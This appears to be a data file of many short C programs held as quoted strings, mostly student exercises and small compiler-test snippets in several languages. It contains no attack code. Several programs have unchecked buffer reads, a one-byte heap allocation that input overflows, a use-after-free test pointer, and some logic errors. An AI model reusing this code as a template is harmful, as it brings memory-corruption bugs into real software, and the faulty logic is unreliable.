    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main() {\n    FILE *arq;\n    arq = fopen(\"ArqGravacao2.txt\", \"rb\");\n    if (arq == ((void*)0)) {\n        printf(\"Problema na criacao do arquivo\");\n        system(\"pause\");\n        exit(1);\n    }\n    char str[20];\n    int t;\n    fread(&t, sizeof(int), 1, arq);\n    fread(str, sizeof(char), t, arq);\n    str[t] = '\\0';\n    puts(str);\n    printf(\"\\nTamanho da string: %d\\n\", t);\n    fclose(arq);\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include<math.h>\nint main()\n{\n    char operator;\n    double a, b;\n    printf(\"Enter an operator (+, -, *,): \");\n    scanf(\"%c\", &operator);\n    printf(\"Enter two inputs: \");\n    scanf(\"%lf %lf\", &a, &b);\n    switch (operator)\n    {\n    case '+':\n        printf(\"%.1lf + %.1lf = %.1lf\", a,b ,a+b);\n        break;\n    case '-':\n        printf(\"%.1lf - %.1lf = %.1lf\", a,b,a-b);\n        break;\n    case '*':\n        printf(\"%.1lf * %.1lf = %.1lf\", a,b,a*b);\n        break;\n    case '/':\n        printf(\"%.1lf / %.1lf = %.1lf\", a,b,a/b);\n        break;\n    default:\n        printf(\"Error! operator is not correct\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n  printf(\"XIn Chao !!!\\n\");\n}",
    "#include<stdio.h>\nint main()\n{\n    float i, sum=0, n;\n    printf(\"Enter N number: \");\n    scanf(\"%f\", &n);\n    for(i=1.5; i<=n; i++)\n    {\n        sum = sum+i;\n    }\n    printf(\"Sum of numbers: %f\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int ih, im, fh, fm, inicio, fim;\n scanf(\"%d %d %d %d\", &ih, &im, &fh, &fm);\n int tempo = (fh * 3600 + fm * 60) - (ih * 3600 + im * 60);\n int hora = tempo / 3600;\n int minuto = tempo % 3600 / 60;\n if(minuto < 0) minuto += 60, hora--;\n if(hora < 0) hora += 24;\n if (hora == 0 && minuto == 0) printf(\"O JOGO DUROU 24 HORA(S) E 0 MINUTO(S)\\n\", hora, minuto);\n else printf(\"O JOGO DUROU %d HORA(S) E %d MINUTO(S)\\n\", hora, minuto);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(int argc, char *argv[])\n{\n double *u = malloc(sizeof(*u));\n (*u) = 2.0;\n printf(\"%p\\n\", &u);\n}",
    "extern char *strcasestr(const char *s1, const char *s2);\nint main()\n{\n  char substring[] = { 'a', 'b', 'c' };\n  char string[] = \"ABCDEFG\";\n  strcasestr(string, substring);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    double result = 0;\n    double valIn = 0;\n    while(valIn != -1){\n        printf(\"ingrese el valor de la comision. (Para finalizar ingresar -1):\");\n        scanf(\"%lf\", &valIn);\n        if(valIn >= 0 && valIn <= 20000){\n            result = valIn * 1.05;\n        }\n        else if(valIn >= 20001 && valIn <= 50000){\n            result = (valIn - 20000) * 0.07 + 1000;\n        }\n        else if(valIn > 50000){\n            result = (valIn - 50000 * 0.1) + 3100;\n        }\n        else{\n            printf(\"el valor es erroneo\\n\");\n            return 0;\n        }\n        printf(\"el valor total de la comision es: %.0lf\\n\\n\\n\", result);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main () {\n float notas[20];\n float BUSCAnota;\n int i;\n int b;\n for (i=0; i<20; i++) {\n  scanf (\"%f\", &notas[i]);\n }\n scanf (\"%f\", &BUSCAnota);\n while (BUSCAnota > 0) {\n  b = 0;\n  for (i=0; i<20; i++) {\n   if (notas[i] == BUSCAnota) {\n   b++;\n   }\n  }\n  if (b > 0) {\n   printf (\"existe\\n\");\n  }\n  else {\n   printf (\"nao existe\\n\");\n  }\n  scanf (\"%f\", &BUSCAnota);\n }\nreturn 0;\n}",
    "#include<stdio.h>\nvoid say_hello_world(){\n    printf(\"hello world!\\n\");\n}\nint main(void){\n    say_hello_world();\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"Hello\\a\\n\");\n    printf(\"Goodbye\\n\");\n}",
    "#include <stdio.h>\nvoid swap(int a, int b);\nvoid swap2(int *a, int *b);\nint main(void)\n{\n  int x = 5;\n  int y = 10;\n  swap(x, y);\n  printf(\"x: %d\\ny: %d\\n\", x, y);\n  swap2(&x, &y);\n  printf(\"x: %d\\ny: %d\\n\", x, y);\n  return 0;\n}\nvoid swap(int a, int b)\n{\n  int temp;\n  temp = a;\n  a = b;\n  b = temp;\n}\nvoid swap2(int *a, int *b)\n{\n  int temp;\n  temp = *a;\n  *a = *b;\n  *b = temp;\n}",
    "typedef float v2sf __attribute__ ((vector_size (2 * sizeof(float))));\nstatic void test (void)\n{\n  v2sf a = {1.0, 0.0};\n  v2sf b = {0.0, 1.0};\n  v2sf d;\n  d = a + b;\n}\nint main ()\n{\n  test ();\n  return 0;\n}",
    "#include<stdio.h>\nint fibo(int n)\n{\n    if(n==1) {return 0;}\n    else if(n==2 || n==3) {return 1;}\n    else return(fibo(n-1)+fibo(n-2));\n}\nint main()\n{\n    int n;\n    printf(\"Enter the number of terms you want to print : \");\n    scanf(\"%d\",&n);\n    printf(\"The series is : \");\n    for(int i=1;i<=n;i++)\n    {\n        printf(\"%d \",fibo(i));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\ntypedef unsigned long long int t_type;\nt_type fib(t_type n, t_type* vector){\n if(n <= 1){\n  return n;\n }\n else if(vector[n-1] != 0){\n  return vector[n-1];\n }\n else{\n  vector[n-1] = fib(n-1, vector) + fib(n-2, vector);\n  return vector[n-1];\n }\n}\nint main(){\n t_type n, aws, size;\n t_type *vector = (t_type*)calloc(93, sizeof(t_type));\n do{\n  scanf(\"%llu\", &n);\n  if(n > 93)printf(\"Choose a smaller number!\\n\");\n }while(n > 93);\n printf(\"Processing...\\n\");\n size = 0;\n aws = fib(n, vector);\n printf(\"Fibonacci of %llu = %llu\\n\", n, aws);\n free(vector);\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int h1,h2,m1,m2,hr,mr;\n    scanf(\"%d %d %d %d\",&h1,&m1,&h2,&m2);\n    if(h1<h2){\n        if(m1<m2){\n            mr = m2 - m1;\n        }\n        else{\n            mr = 60 - m1 + m2;\n            h1 = h1 + 1;\n        }\n         hr = h2 - h1;\n          if(mr == 60){\n            mr = 0;\n            hr = hr + 1;\n        }\n    }\n    else{\n        if(m1<m2){\n            mr = m2 - m1;\n        }\n        else{\n            mr = 60 - m1 + m2;\n            h1 = h1 + 1;\n        }\n         hr = 24 + h2 - h1;\n          if(mr == 60){\n            mr = 0;\n            hr = hr + 1;\n        }\n    }\n    printf(\"O JOGO DUROU %d HORA(S) E %d MINUTO(S)\\n\",hr,mr);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void)\n{\n    setuid(0);\n    system(\"/usr/bin/mdutil -i off -a\");\n    return 0;\n}",
    "#include <stdio.h>\nstatic inline void solve(){\n    int n, g;\n    scanf(\"%d\", &n);\n    double a, h, w;\n    while(n--){\n        scanf(\"%d%lf%lf%lf\", &g, &a, &h, &w);\n        if(g)printf(\"%.2f\\n\", 13.7 * w + 5 * h - 6.8 * a + 66);\n        else printf(\"%.2f\\n\", 9.6 * w + 1.8 * h - 4.7 * a + 655);\n    }\n}\nint main(){\n    solve();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint isBetween20and100(int input);\nint main(int argc, char const* argv[])\n{\n    int input, i = 0;\n    int array[100];\n    srand(time(((void*)0)));\n    do {\n        if (i > 0)\n            printf(\"Your number %d is not between 20 and 100.\\n\", input);\n        printf(\"Insert a number between 20 and 100: \");\n        scanf(\"%d\", &input);\n        printf(\"\\n\");\n        i++;\n    } while (!isBetween20and100(input));\n    for (i = 0; i < input; i++) {\n        array[i] = rand();\n    }\n    for (i = 0; i < input; i++) {\n        printf(\"%dst element: %d\\n\", i + 1, array[i]);\n    }\n    system(\"pause\");\n    return 0;\n}\nint isBetween20and100(int input)\n{\n    return (input >= 20 && input <= 100);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <ctype.h>\nvoid leetConverter(char *str);\nint main() {\n    char *palavra;\n    int i;\n    palavra = (char*) malloc (sizeof(char));\n    scanf(\" %[^\\n]%*c\", palavra);\n    i=strlen(palavra);\n    *(palavra+i) = '|';\n    leetConverter(palavra);\n    free(palavra);\n    return 0;\n}\nvoid leetConverter(char *str) {\n    switch (*str){\n        case '|':\n            return;\n        case '4':{\n            printf(\"A\");\n            break;\n        }\n        case '9':{\n            printf(\"G\");\n            break;\n        }\n        case '7':{\n            printf(\"T\");\n            break;\n        }\n        case '8':{\n            printf(\"B\");\n            break;\n        }\n        case '3':{\n            printf(\"E\");\n            break;\n        }\n        case '#':{\n            printf(\"H\");\n            break;\n        }\n        case '1':{\n            printf(\"I\");\n            break;\n        }\n        case '/':{\n            printf(\"L\");\n            break;\n        }\n        case '0':{\n            printf(\"O\");\n            break;\n        }\n        case '?':{\n            printf(\"P\");\n            break;\n        }\n        case '5':{\n            printf(\"S\");\n            break;\n        }\n        case '2':{\n            printf(\"Z\");\n            break;\n        }\n        default:{\n            *str = toupper(*str);\n            printf(\"%c\", *str);\n            break;\n        }\n    }\n    leetConverter(str + 1);\n}",
    "#include <stdio.h>\n#include <string.h>\nint reverse(int candidate)\n{\n    int retval;\n    char in[16];\n    char out[16];\n    memset( &in[0], 0, 16 );\n    memset( &out[0], 0, 16 );\n    sprintf( in, \"%d\", candidate );\n    int out_index = 0;\n    char *out_ptr = &out[0];\n    for(int loop=strlen(in)-1; loop>=0; loop-- )\n    {\n        if( in[loop] != '-' )\n        {\n            *out_ptr++ = in[loop];\n        }\n    }\n    int scanres = sscanf( (char *)&out[0], \"%d\", &retval );\n    if( scanres != 1 )\n        return 0;\n    if( candidate < 0 )\n        retval *= -1;\n    return retval;\n}\nint main(int argc, char **argv)\n{\n    printf(\"%d\\n\", reverse( 123 ));\n    printf(\"%d\\n\", reverse( -123 ));\n    printf(\"%d\\n\", reverse( 120 ));\n}",
    "#include<stdio.h>\nint main(){\n int t;\n int a,b;\n scanf(\"%d\",&t);\n while(t--){\n  scanf(\"%d %d\",&a,&b);\n  int i,j;\n  int c=0;\n  for(i=0;i<100000;i++){\n   j=i;\n   for(;j<100000;j++){\n    if(j%2==0)c++;\n   }\n  }\n  printf(\"%d\\n\",a+b+c);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\nint sum(int freq[],int i,int j);\nint optCost(int freq[],int i,int j){\n if(j<i){\n  return 0;\n }\n if(j==i){\n  return freq[i];\n }\n int fsum=sum(freq,i,j);\n int min=2147483647;\n for (int r = i; r <=j ; r++)\n {\n  int cost=optCost(freq,i,r-1)+optCost(freq,r+1,j);\n  if(cost<min)\n   min=cost;\n }\n return min+fsum;\n}\nint sum(int freq[],int i,int j){\n int s=0;\n for (int k = i; k <=j ; k++)\n {\n  s+=freq[k];\n }\n return s;\n}\nint optimalSearchTree(int keys[],int freq[],int n){\n return optCost(freq,0,n-1);\n}\nint main()\n{\n int keys[] = {10, 12, 20};\n    int freq[] = {34, 8, 50};\n    int n = sizeof(keys)/sizeof(keys[0]);\n    printf(\"Cost of Optimal BST is %d \", optimalSearchTree(keys, freq, n));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n int mes, anos, dias;\n printf(\"\\t\\t======Descubra sua idade em dias======\\n\\n\");\n printf(\"Escreva sua idade em dias: \");\n scanf(\"%d\", &dias);\n printf(\"Escreva sua idade em meses: \");\n scanf(\"%d\", &mes);\n printf(\"Escreva sua idade em anos: \");\n scanf(\"%d\", &anos);\n dias = (dias + (anos * 365) + (mes * 30));\n printf(\"Sua idade em dias e: %d\", dias);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(int argc, char *argv[]) {\n  int fd;\n  char fileName[] = \"/tmp/foobarXXXXXX\";\n  FILE *file;\n  fd = mkstemp(fileName);\n  if(fd == -1) {\n    fprintf((stderr), \"error on mkstep\\n\");\n    exit(1);\n  }\n  fprintf((stdout), \"%s is the generated filename\\n\", fileName);\n  unlink(fileName);\n  if(close(fd) == -1) {\n    fprintf((stderr), \"error on close\\n\");\n    exit(1);\n  }\n  file = tmpfile();\n  fclose(file);\n  exit(0);\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n    int x = 10;\n    int *point = &x;\n    int deref = *point;\n    printf(\"\\nVariable x is currently %d. *point is %d.\\n\\n\", x, deref);\n    *point = 20;\n    int dereftwo = *point;\n    printf(\"After assigning 20 to the address referenced by point, *point is now %d.\\n\\n\", dereftwo);\n    printf(\"x is now %d.\\n\\n\", x);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint main(void)\n{\n int i,j;\n int A[4][3]={{3,41,68},{34,51,77},{15,18,22},{23,29,31}};\n int B[4][3]={{-1,27,-4},{22,-27,7},{-18,1,-20},{21,-117,30}};\n printf(\"Matrix A+B=\\n\");\n for(i=0;i<4;i++)\n {\n  for(j=0;j<3;j++)\n   printf(\"%4d\",A[i][j]+B[i][j]);\n  printf(\"\\n\");\n }\n system(\"pause\");\n return 0;\n}",
    "#include<stdio.h>\nint zhi(int);\nint main()\n{\n  int n,i;\n  scanf(\"%d\",&n);\n  for(i=n+1;i<=200000;i++)\n  {\n    if(zhi(i)==0)\n    break;\n  }\n  printf(\"%d\",i);\nreturn 0;\n}\nint zhi(int a)\n{\n  int k,m=0;\n  for(k=2;k<a;k++)\n  {\n  if(a%k==0)\n  m++;\n  }\n  return m;\n}",
    "#include<stdio.h>\n#include<sys/types.h>\n#include<unistd.h>\nint main()\n{\n    pid_t pid1, pid2, pid3, pid4;\n    pid1 = fork();\n    pid2 = fork();\n    if(pid2 > 0)\n    {\n        pid3 = fork();\n        if(pid3 > 0)\n        {\n            pid4 = fork();\n        }\n        else if(pid3 == 0)\n        {\n            fork();\n            fork();\n        }\n    }\n    else if(pid2 == 0)\n    {\n        fork();\n        fork();\n    }\n    sleep(5);\n    printf(\"Hi\\n\");\n}",
    "#include <stdio.h>\nint main() {\n long long a1, a2, a3, a4, a5;\n scanf(\"%lld %lld %lld %lld %lld\", &a1, &a2, &a3, &a4, &a5);\n long long ans = a1 + a2 + a3 + a4 + a5;\n printf(\"%lld\\n\", ans);\n}",
    "#include <stdio.h>\nint main(void) {\n    int x;\n    int i;\n    printf(\"\uc815\uc218\ub97c \uc785\ub825\ud558\uc138\uc694 : \");\n    scanf(\"%d\", &x);\n    for (i = 1; i <= 9; i++) {\n        printf(\"%d X %d = %d\\n\", x, i, x * i);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdbool.h>\nint checkSum (int** M, int rows, int cols, int* constantSum) {\n    int expectedSum = 0;\n    for (int i = 0; i < rows; i++) {\n        int currentSum = 0;\n        for (int j = 0; j < cols; j++) {\n            if (i == 0) { expectedSum += M[i][j]; }\n            else { currentSum += M[i][j]; }\n        }\n        if (i >= 1 && currentSum != expectedSum){\n            return 0;\n        }\n    }\n    for (int j = 0; j < cols; j++) {\n        int currentSum = 0;\n        for (int i = 0; i < rows; i++) {\n            currentSum += M[j][i];\n        }\n        if (currentSum != expectedSum){\n            return 0;\n        }\n    }\n    int currentSum = 0;\n    for (int i = 0; i < rows; i++) {\n        currentSum += M[i][i];\n    }\n    if (currentSum != expectedSum){\n        return 0;\n    }\n    currentSum = 0;\n    int j = 0;\n    for (int i = rows-1; i >= 0; i--) {\n        currentSum += M[i][j++];\n    }\n    if (currentSum != expectedSum){\n        return 0;\n    }\n    *constantSum = expectedSum;\n    return 1;\n}\nint main(int argc, char *argv[]) {\n    int nRows, nCols, k =0;\n    scanf(\" %d\", &nRows);\n    scanf(\" %d\", &nCols);\n    int** matrix = malloc( sizeof(int*) * nRows);\n    if (matrix == ((void*)0)) {\n        printf(\"Cannot allocate new array. Exiting...\\n\");\n        exit(1);\n    }\n    for (int i = 0; i < nRows; i++) {\n        matrix[i] = malloc(sizeof(int) * nCols);\n        if (matrix[i] == ((void*)0)) {\n            printf(\"Cannot allocate new row. Exiting...\\n\");\n            exit(1);\n        }\n    }\n    for (int i = 0; i < nRows; i++) {\n        for (int j = 0; j < nCols; j++) {\n            scanf(\" %d\", &matrix[i][j]);\n        }\n    }\n    for (int i = 0; i < nRows; i++) {\n        for (int j = 0; j < nCols; j++) {\n                printf(\"%d \", matrix[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    int* constantSum = malloc(sizeof(int));\n    if (constantSum == ((void*)0)) {\n        printf(\"Cannot allocate new int. Exiting...\\n\");\n        exit(1);\n    }\n    int ret = checkSum(matrix, nRows, nCols, constantSum);\n    if(ret == 1) {\n        printf(\"M is a magic square (magic constant = %d)\\n\", *constantSum);\n    } else {\n        printf(\"M is NOT a magic square!\\n\");\n    }\n    for (int i = 0; i < nRows; i++) {\n        free(matrix[i]);\n    }\n    free(matrix);\n    matrix = ((void*)0);\n    free(constantSum);\n    constantSum = ((void*)0);\n    return 0;\n}",
    "#include <stdio.h>\nint sumavr(int n, int *s, float *avr);\nint main(void) {\n    int i, sum, s[3] = {2, 5, 10};\n    float avr;\n    for (i = 0; i < 3; i++) printf(\" %d \", s[i]);\n    printf(\"\\n\");\n    sum = sumavr(3, s, &avr);\n    printf(\"sum=%d,avr=%f\\n\", sum, avr);\n    return 0;\n}\nint sumavr(int n, int *s, float *avr) {\n    int i, sum = 0;\n    for (i = 0; i < n; i++) sum += s[i];\n    *avr = (float) sum / (float) n;\n    return sum;\n}",
    "#include <stdio.h>\nint main()\n{\n    double r,g,b,w,c,m,y,k,x,y2,z,x0,y20,z0,maior;\n    printf (\"\\n\\tR: \");\n    scanf (\"%lf\", &r);\n    printf (\"\\n\\tG: \");\n    scanf (\"%lf\", &g);\n    printf (\"\\n\\tB: \");\n    scanf (\"%lf\", &b);\n    if ((r==0)&&(b==0)&&(g==0))\n    {\n        c = 1;\n        m = 1;\n        y = 1;\n        k = 1;\n    }\n    else\n    {\n        maior = r;\n        if (g > maior)\n            maior = g;\n        if (b > maior)\n            maior = b;\n        w = maior/255;\n        c = (w-(r/255))/w;\n        m = (w-(g/255))/w;\n        y = (w-(b/255))/w;\n        k = 1-w;\n    }\n    x = (0.489989*r)+(0.310008*g)+(0.200003*b);\n    y2 = (0.176962*r)+(0.812400*g)+(0.010638*b);\n    z = (0.009999*g)+(0.990001*b);\n    x0 = x/(x+y2+z);\n    y20 = y2/(x+y2+z);\n    z0 = z/(x+y2+z);\n    printf (\"\\n\\tC: %lf\\n\\tM: %lf\\n\\tY: %lf\\n\\tK: %lf\\n\\n\\tX: %lf\\n\\tY: %lf\\n\\tZ: %lf\\n\\n\", c,m,y,k,x0,y20,z0);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    puts(\"Olah\");\n    puts(\"Desejo boas-vindas ao meu programa.\");\n    puts(\"Soh isso mesmo, tchau!\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int n, i, max = 0;\n    scanf(\"%d\", &n);\n    char colar[n];\n    for (i = 0; i < n; i++)\n        scanf(\" %c\", &colar[i]);\n    for (i = 0; i < n; i++) {\n        int pedrasdir = 0, pedrasesq = 0;\n        int cont = i, var = i + 1;\n        char coratual = colar[i];\n        while (colar[cont] == coratual || colar[cont] == 'w' || coratual == 'w') {\n            pedrasesq++;\n            cont--;\n            if (coratual == 'w' && colar[cont] != 'w')\n                coratual = colar[cont];\n            if (cont == -1)\n                cont = n-1;\n            if (pedrasesq == n)\n                break;\n        }\n        if (var == n)\n            var = 0;\n        coratual = colar[var];\n        while (colar[var] == coratual || colar[var] == 'w' || coratual == 'w') {\n            pedrasdir++;\n            var++;\n            if (coratual == 'w' && colar[var] != 'w')\n                coratual = colar[var];\n            if (var == n)\n                var = 0;\n            if (pedrasdir == n)\n                break;\n        }\n        if (pedrasdir + pedrasesq > max)\n            max = pedrasdir + pedrasesq;\n    }\n    if (max > n)\n        max = n;\n    printf(\"%d\\n\", max);\n    return 0;\n}",
    "#include <stdio.h>\nvoid plan(double *, double *, double *);\nint main(void) {\n    double a, b, c;\n    scanf(\"%lf %lf %lf\", &a, &b, &c);\n    plan(&a, &b, &c);\n    printf(\"%lf %lf %lf\\n\", a, b, c);\n    return 0;\n}\nvoid plan(double * a, double * b, double * c) {\n    double x, y, z;\n    if (*a > *b) {\n        if (*a > *c) {\n            x = *a;\n            if (*b > *c) y = *b, z = *c;\n            else y = *c, z = *b;\n        }\n        else {\n            x = *c;\n            y = *a;\n            z = *b;\n        }\n    }\n    else {\n        if (*b > *c) {\n            x = *b;\n            if (*a > *c) y = *a, z = *c;\n            else y = *c, z = *a;\n        }\n        else {\n            x = *c;\n            y = *b;\n            z = *a;\n        }\n    }\n    *a = x;\n    *b = y;\n    *c = z;\n}",
    "#include<stdio.h>\nint main(){\n int x;\n printf(\"Enter any number\\n\");\n scanf(\"%d\",&x);\n if(x & 1 == 1){\n  printf(\"number is odd\\n\");\n }else{\n  printf(\"number is even\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\n\nint Stack[5];\nint top = -1;\nvoid push(int x)\n{\n    printf(\"Push Operation \\n\");\n    if(top < 5 -1)\n    {\n        top = top+1;\n        Stack[top] = x;\n        printf(\"The Element %d is added into stack\\n\",x);\n    }\n    else\n    {\n        printf(\"No Space in the stack!\\n\");\n    }\n}\nvoid pop()\n{\n    printf(\"Pop Operation \\n\");\n    if(top>=0)\n    {\n        printf(\"Top element of the stack is %d\\n\",Stack[top]);\n        top--;\n    }\n    else\n    {\n        printf(\"There is no element is the stack to pop! Empty stack!\\n\");\n    }\n}\nvoid peek()\n{\n    printf(\"Peek Operation \\n\");\n    if(top>=0)\n    {\n        printf(\"Top element of the stack is %d\\n\",Stack[top]);\n    }\n    else\n    {\n        printf(\"There is no element is the stack! Empty stack!\\n\");\n    }\n}\nvoid display()\n{\n    printf(\"All element in Stack : \");\n    for(int i=top; i>=0; i--)\n    {\n        printf(\"%d \",Stack[i]);\n    }\n    printf(\"\\n\\n\");\n}\nint main()\n{\n    push(3);\n    push(5);\n    peek();\n    push(2);\n    display();\n    peek();\n    push(8);\n    pop();\n    push(10);\n    push(5);\n    peek();\n    display();\n    return 0;\n}",
    "#include <stdio.h>\nint mul(int x, int y) {\n    int r = 0;\n    for ( ; x; y <<= 1, x >>= 1)\n        if (x & 1)\n            r += y;\n    return r;\n}\nint main() {\n    int x, y;\n    scanf(\"%d%d\", &x, &y);\n    printf(\"%d\", mul(x, y));\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n int input = 0, i = 0, sign = -1;\n double sum = 1.0, term = 0.0;\n printf(\"This series prints the sum of the series 1 - 1/3 + 1/9 - 1/27  .... upto n terms. \\n\");\n printf(\"Enter the value of n.\\n\");\n scanf(\"%d\", &input);\n for(i = 1; i < input; i++)\n {\n  if(i % 2 != 0)\n  {\n   term = sign * (1/pow(3,i));\n  }\n  else\n  {\n   term = 1/(pow(3,i));\n  }\n  sum = sum + term ;\n }\n printf(\"The sum of the series till n is %2.4f. \\n\", sum);\n return 0;\n}",
    "int main(){\n  unsigned long long a ;\n  unsigned long long addr;\n  if(a + addr > 0x0ffffffffULL){\n    return 1;\n  }\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<locale.h>\nint main()\n{\n    setlocale(6, \"Portuguese\");\n    int num1, num2, res;\n    char op;\n    printf(\"Write a expression: \");\n    scanf(\"%d %c %d\", &num1, &op, &num2);\n    switch(op)\n    {\n        case '+': res = num1 + num2;\n                  break;\n        case '-': res = num1 - num2;\n                  break;\n        case '*':\n        case 'x':\n        case 'X': res = num1 * num2;\n                  break;\n        case '/':\n        case '\\\\':\n        case ':': res = num1 / num2;\n                  break;\n    }\n    printf(\"%d %c %d = %d\\n\", num1, op, num2, res);\n    printf(\"\\n\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main () {\n int i, c = 0;\n for (i = 1; i <= 100; ++i) {\n  if (i%2 == 0) {\n   c += i;\n  }\n }\n printf (\"%d\\n\", c);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nvoid merge(int vetor[], int tamanho) {\n  int meio = tamanho / 2;\n  int i = 0, j = meio, k = 0;\n  int aux[tamanho];\n  while( i < meio && j < tamanho ){\n    if( vetor[i] <= vetor[j] )\n      aux[k] = vetor[i++];\n    else\n      aux[k] = vetor[j++];\n    k++;\n  }\n  if( i == meio )\n    while( j < tamanho )\n      aux[k++] = vetor[j++];\n  else\n    while( i < meio )\n      aux[k++] = vetor[i++];\n  for( i = 0; i < tamanho; i++ )\n    vetor[i] = aux[i];\n}\nint mergeSort(int vetor[], int tamanho){\n int meio = tamanho / 2;\n if( tamanho > 1 ){\n  mergeSort(vetor, meio);\n  mergeSort(vetor + meio, tamanho - meio);\n  merge(vetor, tamanho);\n }\n}\nint main(){\n int vetor[100];\n srand(time(((void*)0)));\n for(int i = 0; i < 100; i++){\n  vetor[i] = rand()%1000;\n  printf(\"%d, \", vetor[i]);\n }\n printf(\"\\n\\n\");\n mergeSort(vetor, 100);\n for(int i = 0; i < 100; i++){\n  printf(\"%d, \", vetor[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int num, maior = 0;\n    do {\n        scanf(\"%d\", &num);\n        if(num > maior) {\n            maior = num;\n        }\n    } while (num != 0);\n    printf(\"%d\", maior);\n    return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n    freopen(\"input.txt\", \"r\", (stdin));\n freopen(\"output.txt\", \"w\", (stdout));\n    printf(\"Hello Prof\");\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int t,n,i,j,k,x,y;\n long long int ans;\n scanf(\"%d %d %d\",&n,&x,&y);\n ans=((long long int)(n+1)*(n+2))/2;\n printf(\"%lld\\n\",ans);\n return 0;\n}",
    "#include <stdlib.h>\nint main() {\n  char *Buffer = (char *)malloc(128 * sizeof(char));\n  for (int I = 0; I < 128; ++I) {\n    Buffer[I] = 42;\n  }\n  Buffer[42] = 13;\n  __attribute__((annotate(\"psr.source\"))) char *P = &Buffer[42];\n  free(Buffer);\n  return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n int count, sum;\n count = 0;\n sum = 0;\n while (count++ < 20)\n  sum = sum + count;\n printf(\"sum = %d\\n\", sum);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\nint main(){\n    int cont = 0;\n    char carac;\n    do\n    {\n        cont += 1;\n        printf(\"%i vezes \\n\", cont);\n        printf(\"Digite 0 para sair do looping \\n\");\n        fflush((stdin));\n        carac = getchar();\n    }\n    while (carac != '0');\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nvoid die_usage(void)\n{\n  fprintf((stderr), \"Usage: execve argv0 [argv1...]\\n\");\n  exit(1);\n}\nint main(int argc, char *const argv[])\n{\n  if (argc < 2) {\n    die_usage();\n  }\n  execve(argv[1], &argv[1], ((void*)0));\n  const size_t errmsg_len = sizeof \"execve: \" + strlen(argv[1]) + 1;\n  char errmsg[errmsg_len];\n  snprintf(errmsg, errmsg_len, \"execve: %s\", argv[1]);\n  perror(errmsg);\n  exit(1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid printSequence(int sequence[], int sequenceLength) {\n    for (int i = 0; i < sequenceLength; i++) { printf(\"%d \", sequence[i]); }\n    printf(\"\\n\");\n}\nvoid reverseMibonacci(int sequence[], int sequenceLength) {\n    int start = 0;\n    int end = sequenceLength-1;\n    int temp;\n    while (start < end) {\n        temp = sequence[start];\n        sequence[start] = sequence[end];\n        sequence[end] = temp;\n        start++;\n        end--;\n    }\n}\nint main() {\n    FILE *filePointer = fopen(\"task1.txt\", \"r\");\n    int maxLength = 100;\n    int sequenceLength = 0;\n    int *sequence = malloc(sizeof(int) * (maxLength + 1));\n    for (int i = 0; i < maxLength; i++) {\n        if (fscanf(filePointer, \"%d \", &sequence[i]) == 1) sequenceLength++;\n        else {\n            sequence[i] = -1;\n            break;\n        }\n    }\n    fclose(filePointer);\n    reverseMibonacci(sequence, sequenceLength);\n    printSequence(sequence, sequenceLength);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <fcntl.h>\nint main(int argc, char **argv)\n{\n    int fd;\n    mkfifo(\"/tmp/testing.fifo\", 0644);\n    fd = open(\"/tmp/testing.fifo\", (0x04000000));\n    if (fd == -1)\n    {\n        perror(\"open error\");\n        exit(1);\n    }\n    printf(\"read open FIFO success \\n\");\n    char buf[128];\n    while (1)\n    {\n        sleep(1);\n        ssize_t r = read(fd, buf, sizeof(buf) - 1);\n        if (r > 0)\n        {\n            buf[r] = '\\0';\n            printf(\"buf is: %s\\n\", buf);\n        }\n        else\n        {\n            perror(\"read error\");\n            return 3;\n        }\n    }\n    close(fd);\n    return 0;\n}",
